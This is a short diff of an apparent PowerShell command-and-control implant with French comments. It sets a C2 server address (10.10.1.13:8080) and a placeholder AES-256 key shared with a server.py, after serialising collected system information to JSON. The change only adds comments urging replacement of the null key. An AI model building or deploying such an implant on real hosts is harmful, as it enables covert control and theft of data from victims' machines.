@@ -204,7 +204,9 @@ $jsonData = $sysInfo | ConvertTo-Json -Compress
 $c2Base = "http://10.10.1.13:8080"
 
 # ── Clé AES-256 partagée avec server.py (32 octets hex) ───────
-# Remplacer par la valeur générée avec :
+# !! IMPORTANT – REMPLACER AVANT UTILISATION !!
+# La valeur ci-dessous est un PLACEHOLDER (clé nulle).
+# Générer une vraie clé avec :
 #   python -c "import secrets; print(secrets.token_hex(32))"
 # puis passer la même valeur à server.py --key <hex>.
 $c2AesKeyHex = "0000000000000000000000000000000000000000000000000000000000000000"
